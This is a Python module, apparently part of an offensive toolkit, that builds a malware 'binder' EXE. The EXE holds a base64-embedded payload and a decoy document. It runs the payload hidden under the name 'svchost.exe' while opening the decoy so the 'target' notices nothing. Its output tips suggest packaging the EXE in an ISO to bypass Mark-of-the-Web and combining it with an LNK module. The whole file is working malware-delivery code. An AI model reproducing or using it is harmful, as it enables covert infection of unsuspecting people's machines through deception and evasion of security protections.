import os
import sys
import base64
import shutil
import subprocess
import tempfile
from config import OUTPUT_DIR


def generate_stub_script(payload_path, decoy_path, payload_run_name="svchost.exe"):
    """
    Generate a stub Python script.
    This script, compiled by PyInstaller, becomes the final bundled EXE.
    """
    with open(payload_path, 'rb') as f:
        payload_b64 = base64.b64encode(f.read()).decode()

    with open(decoy_path, 'rb') as f:
        decoy_b64 = base64.b64encode(f.read()).decode()

    decoy_ext = os.path.splitext(decoy_path)[1]
    decoy_run_name = f"document{decoy_ext}"

    stub = f'''import os
import sys
import base64
import subprocess
import tempfile
import threading

def main():
    temp_dir = tempfile.mkdtemp()

    # Extract payload
    payload_data = base64.b64decode("{payload_b64}")
    payload_path = os.path.join(temp_dir, "{payload_run_name}")
    with open(payload_path, "wb") as f:
        f.write(payload_data)

    # Extract decoy document
    decoy_data = base64.b64decode("{decoy_b64}")
    decoy_path = os.path.join(temp_dir, "{decoy_run_name}")
    with open(decoy_path, "wb") as f:
        f.write(decoy_data)

    # Launch payload in background (hidden window)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # SW_HIDE

    try:
        subprocess.Popen(
            [payload_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass

    # Open decoy document in foreground
    try:
        os.startfile(decoy_path)
    except Exception:
        subprocess.Popen(["cmd", "/c", "start", "", decoy_path],
                        startupinfo=startupinfo)

if __name__ == "__main__":
    main()
'''
    return stub


def generate_binder_exe(payload_path, decoy_path, output_filename="demo.exe",
                         payload_run_name="svchost.exe", icon_path=None,
                         one_file=True):
    """
    Generate a bundled EXE file.

    Args:
        payload_path: path to the original payload EXE
        decoy_path: path to the decoy document
        output_filename: output EXE filename
        payload_run_name: process name after payload extraction (disguise)
        icon_path: optional EXE icon file (.ico)
        one_file: True=single file mode, False=directory mode

    Returns: (success: bool, message: str)
    """
    try:
        if not os.path.exists(payload_path):
            return False, f"Payload file not found: {payload_path}"
        if not os.path.exists(decoy_path):
            return False, f"Decoy file not found: {decoy_path}"

        # Check PyInstaller availability
        pyinstaller_path = shutil.which('pyinstaller')
        if not pyinstaller_path:
            try:
                result = subprocess.run(
                    [sys.executable, '-m', 'PyInstaller', '--version'],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode != 0:
                    return False, (
                        "PyInstaller not found. Please install first:\n"
                        "pip install pyinstaller\n\n"
                        "After installation, click Generate again."
                    )
                pyinstaller_cmd = [sys.executable, '-m', 'PyInstaller']
            except Exception:
                return False, (
                    "PyInstaller not found. Please install first:\n"
                    "pip install pyinstaller"
                )
        else:
            pyinstaller_cmd = [pyinstaller_path]

        work_dir = tempfile.mkdtemp(prefix="binder_build_")

        try:
            # 1. Generate stub script
            stub_code = generate_stub_script(payload_path, decoy_path, payload_run_name)
            stub_path = os.path.join(work_dir, "stub.py")
            with open(stub_path, 'w', encoding='utf-8') as f:
                f.write(stub_code)

            # 2. Build PyInstaller command
            output_name = os.path.splitext(output_filename)[0]

            cmd = pyinstaller_cmd + [
                '--noconfirm',
                '--clean',
                '--noconsole',
                '--name', output_name,
                '--distpath', OUTPUT_DIR,
                '--workpath', os.path.join(work_dir, 'build'),
                '--specpath', work_dir,
            ]

            if one_file:
                cmd.append('--onefile')

            if icon_path and os.path.exists(icon_path):
                cmd.extend(['--icon', icon_path])

            cmd.append(stub_path)

            # 3. Execute PyInstaller
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=120, cwd=work_dir
            )

            # 4. Check output
            if one_file:
                expected_output = os.path.join(OUTPUT_DIR, f"{output_name}.exe")
            else:
                expected_output = os.path.join(OUTPUT_DIR, output_name, f"{output_name}.exe")

            if os.path.exists(expected_output):
                file_size = os.path.getsize(expected_output)
                if file_size > 1048576:
                    size_str = f"{file_size / 1048576:.1f} MB"
                else:
                    size_str = f"{file_size / 1024:.1f} KB"

                payload_size = os.path.getsize(payload_path)
                decoy_size = os.path.getsize(decoy_path)

                return True, (
                    f"Bundled EXE generated: {expected_output}\n"
                    f"File size: {size_str}\n\n"
                    f"Embedded files:\n"
                    f"  Payload: {os.path.basename(payload_path)} ({payload_size/1024:.1f} KB)\n"
                    f"    -> Extracted as: %TEMP%\\xxx\\{payload_run_name}\n"
                    f"  Decoy: {os.path.basename(decoy_path)} ({decoy_size/1024:.1f} KB)\n"
                    f"    -> Auto-opened after extraction\n\n"
                    f"When the target double-clicks this EXE:\n"
                    f"1. {payload_run_name} runs silently in the background (no window)\n"
                    f"2. {os.path.basename(decoy_path)} opens in the foreground\n"
                    f"3. Target sees a normal document, no suspicion\n\n"
                    f"Tips:\n"
                    f"• Can be combined with the LNK module\n"
                    f"• Package into ISO to bypass MOTW"
                )
            else:
                error_msg = result.stderr if result.stderr else result.stdout
                return False, f"PyInstaller build failed:\n{error_msg[-500:]}"

        finally:
            try:
                shutil.rmtree(work_dir, ignore_errors=True)
            except Exception:
                pass

    except subprocess.TimeoutExpired:
        return False, "PyInstaller build timed out (120s). Check file size."
    except Exception as e:
        return False, f"Failed to generate bundled EXE: {str(e)}"


def generate_stub_only(payload_path, decoy_path, output_filename="stub.py",
                        payload_run_name="svchost.exe"):
    """
    Generate only the stub Python script (without compiling to EXE).
    Users can compile it themselves with PyInstaller.
    """
    try:
        if not os.path.exists(payload_path):
            return False, f"Payload file not found: {payload_path}"
        if not os.path.exists(decoy_path):
            return False, f"Decoy file not found: {decoy_path}"

        stub_code = generate_stub_script(payload_path, decoy_path, payload_run_name)

        output_path = os.path.join(OUTPUT_DIR, output_filename)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(stub_code)

        return True, (
            f"Stub script generated: {output_path}\n\n"
            f"Manual build command:\n"
            f"pyinstaller --onefile --noconsole --name output {output_path}\n\n"
            f"Optional arguments:\n"
            f"  --icon app.ico    Add custom icon\n"
            f"  --uac-admin       Request admin privileges\n"
            f"  --key YOUR_KEY    Encrypt Python bytecode\n\n"
            f"After build, the EXE will be in the dist/ directory."
        )
    except Exception as e:
        return False, f"Failed to generate stub script: {str(e)}"
